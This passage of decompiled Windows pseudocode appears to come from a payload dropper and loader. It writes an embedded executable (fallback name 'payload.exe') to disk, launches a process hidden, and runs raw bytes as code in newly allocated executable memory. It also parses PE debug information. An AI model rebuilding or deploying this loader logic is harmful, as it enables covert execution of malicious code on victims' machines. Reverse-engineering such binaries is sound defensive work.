       (uVar53 = (ulonglong)*(ushort *)(pcVar41 + (uVar37 - 0xc)),
       uVar53 + 0xc <= uVar37 && *(ushort *)(pcVar41 + (uVar37 - 0xc)) != 0)) {
      uVar52 = (ulonglong)*(uint *)(pcVar41 + (uVar37 - 10));
      uVar58 = (uVar37 - 0xc) - uVar53;
      if (uVar52 <= uVar58) {
        *(ulonglong *)(&stack0x00004cd0 + lVar20) = uVar58 - uVar52;
        *(char **)(&stack0x00004d30 + lVar20) = pcVar41 + (uVar58 - uVar52);
        *(char **)(&stack0x00004ce0 + lVar20) = pcVar41;
        pcVar39 = pcVar41 + uVar58;
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000366b;
        pcVar41 = FUN_140006a5c(*(longlong *)(&stack0x00004cd8 + lVar20),uVar32);
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003689;
        FUN_140006d51((longlong *)(&stack0x00004660 + lVar20),(longlong)pcVar41,uVar32,'.');
        if ((&stack0x00004668)[lVar20] == '\0') {
          plVar54 = (longlong *)(&stack0x000047f0 + lVar20);
          *plVar54 = (longlong)pcVar41;
          *(ulonglong *)(&stack0x000047f8 + lVar20) = uVar32;
        }
        else {
          plVar54 = (longlong *)(&stack0x000047f0 + lVar20);
          *plVar54 = (longlong)pcVar41;
          *(undefined8 *)(&stack0x000047f8 + lVar20) = *(undefined8 *)(&stack0x00004660 + lVar20);
        }
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400036ca;
        FUN_140006f8e((undefined8 *)(&stack0x00004b30 + lVar20),&stack0x00004460 + lVar20,plVar54);
        if (*(short *)(&stack0x00004b40 + lVar20) == 0) {
          pcVar41 = *(char **)(&stack0x00004b30 + lVar20);
          uVar43 = *(undefined8 *)(&stack0x00004b38 + lVar20);
        }
        else {
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0xb;
          uVar43 = *(undefined8 *)((longlong)&uStack_48 + lVar20);
          pcVar41 = "payload.exe";
        }
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400036fd;
        FUN_140006ea7(pcVar41,uVar43,*(LPCVOID *)(&stack0x00004d30 + lVar20),uVar52);
        pcVar41 = *(char **)(&stack0x00004ce0 + lVar20);
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003719;
        FUN_140006af4((longlong)pcVar39,uVar53,pcVar41,*(ulonglong *)(&stack0x00004cd0 + lVar20));
        goto LAB_1400032d3;
      }
    }
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003128;
    pcVar39 = FUN_140006a5c(*(longlong *)(&stack0x00004cd8 + lVar20),uVar32);
    if (((uVar37 < 2) || (*pcVar41 != 'M')) || (pcVar41[1] != 'Z')) {
      if (3 < uVar32) {
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 4;
        lVar33 = *(longlong *)((longlong)&uStack_48 + lVar20);
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003189;
        bVar48 = FUN_140006a0a((longlong)(pcVar39 + (uVar32 - 4)),lVar33,0x1400172f7,lVar33);
        if ((bVar48 & 1) != 0) {
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000319c;
          pCVar38 = FUN_14000714e(&stack0x000041e0 + lVar20);
          *(LPSTR *)(&stack0x000043f0 + lVar20) = pCVar38;
          *(longlong *)(&stack0x000043f8 + lVar20) = lVar33;
          *(char **)(&stack0x00004400 + lVar20) = pcVar39;
          *(ulonglong *)(&stack0x00004408 + lVar20) = uVar32;
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400031c8;
          FUN_140006959((undefined8 *)(&stack0x00004a10 + lVar20),&stack0x00004660 + lVar20,
                        (longlong *)(&stack0x000043f0 + lVar20));
          if (*(short *)(&stack0x00004a20 + lVar20) == 0) {
            pCVar44 = *(LPCSTR *)(&stack0x00004a10 + lVar20);
            *(undefined8 *)(&stack0xfffffffffffffff0 + lVar20) = 0;
            *(undefined4 *)(&stack0xffffffffffffffe8 + lVar20) = 0x80;
            *(undefined4 *)(&stack0xffffffffffffffe0 + lVar20) = 2;
            *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003323;
            pvVar35 = CreateFileA(pCVar44,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,
                                  *(DWORD *)(&stack0xffffffffffffffe0 + lVar20),
                                  *(DWORD *)(&stack0xffffffffffffffe8 + lVar20),
                                  *(HANDLE *)(&stack0xfffffffffffffff0 + lVar20));
            if (pvVar35 != (HANDLE)0xffffffffffffffff) {
              pDVar3 = (LPDWORD)(&stack0x00004a50 + lVar20);
              *pDVar3 = 0;
              *(undefined8 *)(&stack0xffffffffffffffe0 + lVar20) = 0;
              *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003357;
              WriteFile(pvVar35,pcVar41,(DWORD)uVar37,pDVar3,
                        *(LPOVERLAPPED *)(&stack0xffffffffffffffe0 + lVar20));
              *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000335f;
              CloseHandle(pvVar35);
              if (uVar37 == *pDVar3) {
                *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000337e;
                UVar28 = GetSystemDirectoryA(&stack0x000047f0 + lVar20,0x104);
                if (UVar28 != 0) {
                  puVar50 = &DAT_1400194c0;
                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0xb;
                  uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000339f;
                  lVar33 = FUN_1400056d3((longlong)(&stack0x00004b10 + lVar20),0x1400194c0,uVar32);
                  *(undefined ***)(&stack0x00004460 + lVar20) = &PTR_FUN_140017348;
                  *(undefined1 **)(&stack0x00004468 + lVar20) = &stack0x00004b30 + lVar20;
                  *(undefined8 *)(&stack0x00004470 + lVar20) = 0x104;
                  *(undefined8 *)(&stack0x00004478 + lVar20) = 0;
                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400033e4;
                  sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00004460 + lVar20),
                                         (longlong)(&stack0x000047f0 + lVar20),(ulonglong)UVar28,
                                         0x140017320);
                  if (sVar25 == 0) {
                    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1;
                    uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003404;
                    sVar25 = FUN_14000541c((undefined8 *)(&stack0x00004460 + lVar20),0x1400194e1,
                                           uVar32);
                    if (sVar25 == 0) {
                      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003426;
                      sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00004460 + lVar20),lVar33,
                                             (ulonglong)puVar50,0x140017320);
                      if (sVar25 == 0) {
                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1;
                        uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003446;
                        sVar25 = FUN_14000541c((undefined8 *)(&stack0x00004460 + lVar20),0x1400194e0
                                               ,uVar32);
                        if (sVar25 == 0) {
                          lVar33 = *(longlong *)(&stack0x00004468 + lVar20);
                          lVar55 = *(longlong *)(&stack0x00004478 + lVar20);
                          puVar50 = &DAT_1400194cb;
                          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 5;
                          uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003477;
                          lVar57 = FUN_1400056d3((longlong)(&stack0x00004a80 + lVar20),0x1400194cb,
                                                 uVar32);
                          *(undefined **)(&stack0x00004cc8 + lVar20) = puVar50;
                          puVar50 = &DAT_1400194d0;
                          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x10;
                          uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003498;
                          uVar43 = FUN_1400056d3((longlong)(&stack0x00004770 + lVar20),0x1400194d0,
                                                 uVar32);
                          *(undefined8 *)(&stack0x00004cd8 + lVar20) = uVar43;
                          *(undefined **)(&stack0x00004ce0 + lVar20) = puVar50;
                          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400034ae;
                          lVar40 = FUN_1400053fc((longlong)pCVar44);
                          *(undefined ***)(&stack0x00004900 + lVar20) = &PTR_FUN_140017348;
                          *(undefined1 **)(&stack0x00004908 + lVar20) = &stack0x00004460 + lVar20;
                          *(undefined8 *)(&stack0x00004910 + lVar20) = 0x144;
                          *(undefined8 *)(&stack0x00004918 + lVar20) = 0;
                          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400034ef;
                          sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00004900 + lVar20),lVar33,
                                                 lVar55 - 1,0x140017320);
                          if (sVar25 == 0) {
                            *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003515;
                            sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00004900 + lVar20),lVar57,
                                                   *(ulonglong *)(&stack0x00004cc8 + lVar20),
                                                   0x140017320);
                            if (sVar25 == 0) {
                              *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003537;
                              sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00004900 + lVar20),
                                                     lVar40,(ulonglong)puVar50,0x140017320);
                              if (sVar25 == 0) {
                                *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003561;
                                sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00004900 + lVar20),
                                                       *(longlong *)(&stack0x00004cd8 + lVar20),
                                                       *(ulonglong *)(&stack0x00004ce0 + lVar20),
                                                       0x140017320);
                                if (sVar25 == 0) {
                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1;
                                  uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003584;
                                  sVar25 = FUN_14000541c((undefined8 *)(&stack0x00004900 + lVar20),
                                                         0x1400194e0,uVar32);
                                  if (sVar25 == 0) {
                                    uVar43 = *(undefined8 *)(&stack0x00004908 + lVar20);
                                    *(undefined8 *)(&stack0x00004900 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004908 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004930 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004938 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004910 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004918 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004920 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004928 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004940 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004948 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004960 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004950 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004958 + lVar20) = 0;
                                    *(undefined4 *)(&stack0x00004900 + lVar20) = 0x68;
                                    *(undefined4 *)(&stack0x0000493c + lVar20) = 1;
                                    *(undefined8 *)(&stack0x00004aa0 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004aa8 + lVar20) = 0;
                                    *(undefined8 *)(&stack0x00004ab0 + lVar20) = 0;
                                    *(undefined1 **)((longlong)auStackX_8 + lVar20) =
                                         &stack0x00004aa0 + lVar20;
                                    *(undefined1 **)((longlong)auStackX_8 + lVar20 + -8) =
                                         &stack0x00004900 + lVar20;
                                    *(undefined8 *)(&stack0xfffffffffffffff0 + lVar20) = 0;
                                    *(undefined8 *)(&stack0xfffffffffffffff8 + lVar20) = 0;
                                    *(undefined4 *)(&stack0xffffffffffffffe8 + lVar20) = 0x8000000;
                                    *(undefined4 *)(&stack0xffffffffffffffe0 + lVar20) = 0;
                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003616;
                                    iVar29 = (*DAT_1400340c0)(0,uVar43,0,0);
                                    if (iVar29 == 0) {
                                      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000411f;
                                      GetLastError();
                                    }
                                    else {
                                      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000362a;
                                      CloseHandle(*(HANDLE *)(&stack0x00004aa8 + lVar20));
                                      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003636;
                                      CloseHandle(*(HANDLE *)(&stack0x00004aa0 + lVar20));
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
          goto LAB_1400032d3;
        }
      }
      if (uVar37 < 8) {
        if (uVar37 < 4) goto LAB_1400032d3;
      }
      else {
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 8;
        uVar53 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003200;
        uVar53 = FUN_14000ad55(pcVar41,uVar53,&DAT_1400172fc,uVar53);
        if ((uVar53 & 1) != 0) {
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003215;
          FUN_140006af4((longlong)pcVar39,uVar32,pcVar41,uVar37);
          goto LAB_1400032d3;
        }
      }
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 4;
      uVar43 = *(undefined8 *)((longlong)&uStack_48 + lVar20);
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000324d;
      lVar33 = (*DAT_1400340a8)(0,uVar37,0x3000,uVar43);
      if (lVar33 != 0) {
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003263;
        FUN_14000d5a5(lVar33,(longlong)pcVar41,uVar37);
        *(undefined4 *)(&stack0x00004b30 + lVar20) = 0;
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x20;
        uVar43 = *(undefined8 *)((longlong)&uStack_48 + lVar20);
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000327e;
        iVar29 = (*DAT_1400340b0)(lVar33,uVar37,uVar43);
        if (iVar29 != 0) {
          *(undefined4 *)(&stack0x00004460 + lVar20) = 0;
          *(undefined1 **)(&stack0xffffffffffffffe8 + lVar20) = &stack0x00004460 + lVar20;
          *(undefined4 *)(&stack0xffffffffffffffe0 + lVar20) = 0;
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400032aa;
          pvVar35 = (HANDLE)(*DAT_1400340b8)(0,0,lVar33,0);
          if (pvVar35 != (HANDLE)0x0) {
            *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0xffffffffffffffff;
            uVar43 = *(undefined8 *)((longlong)&uStack_48 + lVar20);
            *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400032be;
            (*DAT_1400340c8)(pvVar35,uVar43);
            *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400032c6;
            CloseHandle(pvVar35);
          }
        }
      }
    }
    else {
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003152;
      FUN_140006ea7(pcVar39,uVar32,pcVar41,uVar37);
    }
  }
LAB_1400032d3:
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400032d8;
  FUN_140007021((undefined8 *)&DAT_1400172b0,pcVar41,uVar37);
  return;
LAB_140002c72:
  if (((ulonglong)uVar16 / (uVar37 & 0xffffffff)) * 0x1c - lVar33 != 0) {
    if ((*(int *)((longlong)psVar36 + lVar33 + (ulonglong)uVar27 + 0xc) != 2) ||
       (uVar32 = (ulonglong)*(uint *)((longlong)psVar36 + lVar33 + (ulonglong)uVar27 + 0x18),
       *(int *)((longlong)psVar36 + uVar32) != 0x53445352)) goto LAB_140002c91;
    puVar9 = (undefined4 *)((longlong)psVar36 + uVar32 + 4);
    uVar21 = puVar9[1];
    uVar22 = puVar9[2];
    uVar23 = puVar9[3];
    *(undefined4 *)(&stack0x00004b30 + lVar20) = *puVar9;
    *(undefined4 *)(&stack0x00004b34 + lVar20) = uVar21;
    *(undefined4 *)(&stack0x00004b38 + lVar20) = uVar22;
    *(undefined4 *)(&stack0x00004b3c + lVar20) = uVar23;
    *(undefined4 *)(&stack0x00004b40 + lVar20) = *(undefined4 *)((longlong)psVar36 + uVar32 + 0x14);
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x18;
    for (uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
        (uVar37 != 0x117 &&
        (cVar13 = *(char *)((longlong)psVar36 + uVar37 + uVar32),
        (&stack0x00004b2c)[uVar37 + lVar20] = cVar13, cVar13 != '\0')); uVar37 = uVar37 + 1) {
    }
    (&stack0x00004b2c)[uVar37 + lVar20] = 0;
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003779;
    (*DAT_140034320)();
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003781;
    CloseHandle(hObject);
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003789;
    CloseHandle(pvVar35);
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003791;
    FUN_140007ba7((longlong)(&stack0x00004b44 + lVar20));
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003799;
    lVar33 = FUN_140007ba7((longlong)(&stack0x00004b44 + lVar20));
    if (3 < uVar37) {
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 4;
      uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400037bf;
      uVar32 = FUN_14000ad55((char *)(uVar37 + lVar33 + -4),uVar32,".pdb",uVar32);
      if ((uVar32 & 1) != 0) {
        uVar37 = uVar37 - 4;
      }
    }
    uVar14 = *(ushort *)(&stack0x00004b34 + lVar20);
    uVar15 = *(ushort *)(&stack0x00004b36 + lVar20);
    (&stack0x00004d10)[lVar20] = (&stack0x00004b38)[lVar20];
    (&stack0x00004d0c)[lVar20] = (&stack0x00004b39)[lVar20];
    (&stack0x00004d24)[lVar20] = (&stack0x00004b3a)[lVar20];
    (&stack0x00004d26)[lVar20] = (&stack0x00004b3b)[lVar20];
    (&stack0x00004d3c)[lVar20] = (&stack0x00004b3c)[lVar20];
    (&stack0x00004d3d)[lVar20] = (&stack0x00004b3d)[lVar20];
    (&stack0x00004d3e)[lVar20] = (&stack0x00004b3e)[lVar20];
    (&stack0x00004d3f)[lVar20] = (&stack0x00004b3f)[lVar20];
    uVar27 = *(uint *)(&stack0x00004b40 + lVar20);
    *(undefined ***)(&stack0x00000030 + lVar20) = &PTR_FUN_140017348;
    *(undefined1 **)(&stack0x00000038 + lVar20) = &stack0x00004a10 + lVar20;
    *(undefined8 *)(&stack0x00000040 + lVar20) = 0x40;
    *(undefined8 *)(&stack0x00000048 + lVar20) = 0;
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000386f;
    sVar25 = FUN_140008626((undefined8 *)(&stack0x00000030 + lVar20),
                           *(uint *)(&stack0x00004b30 + lVar20));
    if (sVar25 == 0) {
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003883;
      sVar25 = FUN_14000860f((undefined8 *)(&stack0x00000030 + lVar20),uVar14);
      if (sVar25 == 0) {
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003897;
        sVar25 = FUN_14000860f((undefined8 *)(&stack0x00000030 + lVar20),uVar15);
        if (sVar25 == 0) {
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400038af;
          sVar25 = FUN_1400085f8((undefined8 *)(&stack0x00000030 + lVar20),
                                 (&stack0x00004d10)[lVar20]);
          if (sVar25 == 0) {
            *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400038c7;
            sVar25 = FUN_1400085f8((undefined8 *)(&stack0x00000030 + lVar20),
                                   (&stack0x00004d0c)[lVar20]);
            if (sVar25 == 0) {
              *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400038df;
              sVar25 = FUN_1400085f8((undefined8 *)(&stack0x00000030 + lVar20),
                                     (&stack0x00004d24)[lVar20]);
              if (sVar25 == 0) {
                *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400038f7;
                sVar25 = FUN_1400085f8((undefined8 *)(&stack0x00000030 + lVar20),
                                       (&stack0x00004d26)[lVar20]);
                if (sVar25 == 0) {
                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000390f;
                  sVar25 = FUN_1400085f8((undefined8 *)(&stack0x00000030 + lVar20),
                                         (&stack0x00004d3c)[lVar20]);
                  if (sVar25 == 0) {
                    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003927;
                    sVar25 = FUN_1400085f8((undefined8 *)(&stack0x00000030 + lVar20),
                                           (&stack0x00004d3d)[lVar20]);
                    if (sVar25 == 0) {
                      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000393f;
                      sVar25 = FUN_1400085f8((undefined8 *)(&stack0x00000030 + lVar20),
                                             (&stack0x00004d3e)[lVar20]);
                      if (sVar25 == 0) {
                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003957;
                        sVar25 = FUN_1400085f8((undefined8 *)(&stack0x00000030 + lVar20),
                                               (&stack0x00004d3f)[lVar20]);
                        if (sVar25 == 0) {
                          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000396c;
                          sVar25 = FUN_140008576((undefined8 *)(&stack0x00000030 + lVar20),uVar27);
                          if (sVar25 == 0) {
                            lVar55 = *(longlong *)(&stack0x00000038 + lVar20);
                            uVar32 = *(ulonglong *)(&stack0x00000048 + lVar20);
                            *(undefined ***)(&stack0x00000030 + lVar20) = &PTR_FUN_140017348;
                            puVar60 = &stack0x00004770 + lVar20;
                            *(undefined1 **)(&stack0x00000038 + lVar20) = puVar60;
                            *(undefined8 *)(&stack0x00000040 + lVar20) = 0x80;
                            *(undefined8 *)(&stack0x00000048 + lVar20) = 0;
                            *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400039ae;
                            sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00000030 + lVar20),lVar33,
                                                   uVar37,0x140017320);
                            if (sVar25 == 0) {
                              *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1;
                              uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                              *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400039cb;
                              sVar25 = FUN_14000541c((undefined8 *)(&stack0x00000030 + lVar20),
                                                     0x140019ad7,uVar37);
                              if (sVar25 == 0) {
                                *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400039ea;
                                sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00000030 + lVar20),
                                                       lVar55,uVar32,0x140017320);
                                if (sVar25 == 0) {
                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 4;
                                  uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003a0a;
                                  sVar25 = FUN_14000541c((undefined8 *)(&stack0x00000030 + lVar20),
                                                         0x140019ad8,uVar32);
                                  if (sVar25 == 0) {
                                    uVar43 = *(undefined8 *)(&stack0x00000038 + lVar20);
                                    uVar18 = *(undefined8 *)(&stack0x00000048 + lVar20);
                                    pCVar38 = &stack0x00004030 + lVar20;
                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003a2f;
                                    pCVar51 = pCVar38;
                                    GetTempPathA(0x104,pCVar38);
                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003a37;
                                    lVar33 = FUN_1400071fd((longlong)pCVar38);
                                    *(longlong *)(&stack0x00004c50 + lVar20) = lVar33;
                                    *(LPSTR *)(&stack0x00004c58 + lVar20) = pCVar51;
                                    *(undefined8 *)(&stack0x00004c60 + lVar20) = uVar43;
                                    *(undefined8 *)(&stack0x00004c68 + lVar20) = uVar18;
                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003a63;
                                    FUN_140006959((undefined8 *)(&stack0x00004af8 + lVar20),
                                                  &stack0x000041e0 + lVar20,
                                                  (longlong *)(&stack0x00004c50 + lVar20));
                                    if (*(short *)(&stack0x00004b08 + lVar20) == 0) {
                                      pCVar44 = *(LPCSTR *)(&stack0x00004af8 + lVar20);
                                      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003a7d;
                                      DVar26 = GetFileAttributesA(pCVar44);
                                      if (DVar26 == 0xffffffff) {
                                        *(LPCSTR *)(&stack0x00004d10 + lVar20) = pCVar44;
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000413f
                                        ;
                                        DVar26 = GetModuleFileNameA((HMODULE)0x0,
                                                                    &stack0x00004660 + lVar20,0x104)
                                        ;
                                        if (DVar26 - 1 < 0x103) {
                                          *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                               0x14000416d;
                                          FUN_140006d51((longlong *)(&stack0x00004ae8 + lVar20),
                                                        (longlong)(&stack0x00004660 + lVar20),
                                                        (ulonglong)DVar26,'\\');
                                          if ((&stack0x00004af0)[lVar20] != '\0') {
                                            *(undefined1 **)(&stack0x00004ca0 + lVar20) =
                                                 &stack0x00004660 + lVar20;
                                            *(longlong *)(&stack0x00004ca8 + lVar20) =
                                                 *(longlong *)(&stack0x00004ae8 + lVar20) + 1;
                                            *(undefined8 *)(&stack0x00004cb0 + lVar20) = uVar43;
                                            *(undefined8 *)(&stack0x00004cb8 + lVar20) = uVar18;
                                            *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                 0x1400041a9;
                                            FUN_140006959((undefined8 *)(&stack0x00004a50 + lVar20),
                                                          &stack0x000047f0 + lVar20,
                                                          (longlong *)(&stack0x00004ca0 + lVar20));
                                            pCVar44 = *(LPCSTR *)(&stack0x00004a50 + lVar20);
                                            if (pCVar44 != (LPCSTR)0x0 &&
                                                *(short *)(&stack0x00004a60 + lVar20) == 0) {
                                              *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                   0x1400041c6;
                                              DVar26 = GetFileAttributesA(pCVar44);
                                              if (DVar26 != 0xffffffff) goto LAB_140003a89;
                                            }
                                          }
                                        }
                                        puVar59 = &DAT_140019a41;
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x2c;
                                        uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400041e9
                                        ;
                                        lVar33 = FUN_14000ae64((longlong)(&stack0x00004aa0 + lVar20)
                                                               ,0x140019a41,uVar32);
                                        *(undefined4 *)(&stack0x00004d0c + lVar20) =
                                             *(undefined4 *)(&stack0x00004b30 + lVar20);
                                        *(undefined2 *)(&stack0x00004d24 + lVar20) =
                                             *(undefined2 *)(&stack0x00004b34 + lVar20);
                                        *(undefined2 *)(&stack0x00004d26 + lVar20) =
                                             *(undefined2 *)(&stack0x00004b36 + lVar20);
                                        (&stack0x00004d3c)[lVar20] = (&stack0x00004b38)[lVar20];
                                        (&stack0x00004d3d)[lVar20] = (&stack0x00004b39)[lVar20];
                                        (&stack0x00004d3e)[lVar20] = (&stack0x00004b3a)[lVar20];
                                        (&stack0x00004d3f)[lVar20] = (&stack0x00004b3b)[lVar20];
                                        (&stack0x00004d20)[lVar20] = (&stack0x00004b3c)[lVar20];
                                        (&stack0x00004d21)[lVar20] = (&stack0x00004b3d)[lVar20];
                                        (&stack0x00004d22)[lVar20] = (&stack0x00004b3e)[lVar20];
                                        (&stack0x00004d23)[lVar20] = (&stack0x00004b3f)[lVar20];
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140004283
                                        ;
                                        puVar50 = puVar59;
                                        lVar55 = FUN_140007ba7((longlong)(&stack0x00004b44 + lVar20)
                                                              );
                                        *(undefined4 *)(&stack0x00004cc4 + lVar20) =
                                             *(undefined4 *)(&stack0x00004b40 + lVar20);
                                        *(undefined ***)(&stack0x00004ce8 + lVar20) =
                                             &PTR_FUN_140017348;
                                        *(undefined1 **)(&stack0x00004cf0 + lVar20) =
                                             &stack0x00004460 + lVar20;
                                        *(undefined8 *)(&stack0x00004cf8 + lVar20) = 0x200;
                                        *(undefined8 *)(&stack0x00004d00 + lVar20) = 0;
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400042d0
                                        ;
                                        sVar25 = FUN_1400055ea((undefined8 *)
                                                               (&stack0x00004ce8 + lVar20),lVar33,
                                                               (ulonglong)puVar59,0x140017320);
                                        if (sVar25 == 0) {
                                          *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                               0x1400042f2;
                                          sVar25 = FUN_1400055ea((undefined8 *)
                                                                 (&stack0x00004ce8 + lVar20),lVar55,
                                                                 (ulonglong)puVar50,0x140017320);
                                          if (sVar25 == 0) {
                                            *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1;
                                            uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                                            *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                 0x140004312;
                                            sVar25 = FUN_14000541c((undefined8 *)
                                                                   (&stack0x00004ce8 + lVar20),
                                                                   0x140019adc,uVar32);
                                            if (sVar25 == 0) {
                                              *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                   0x14000432d;
                                              sVar25 = FUN_140008626((undefined8 *)
                                                                     (&stack0x00004ce8 + lVar20),
                                                                     *(uint *)(&stack0x00004d0c +
                                                                              lVar20));
                                              if (sVar25 == 0) {
                                                *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                     0x140004349;
                                                sVar25 = FUN_14000860f((undefined8 *)
                                                                       (&stack0x00004ce8 + lVar20),
                                                                       *(ushort *)
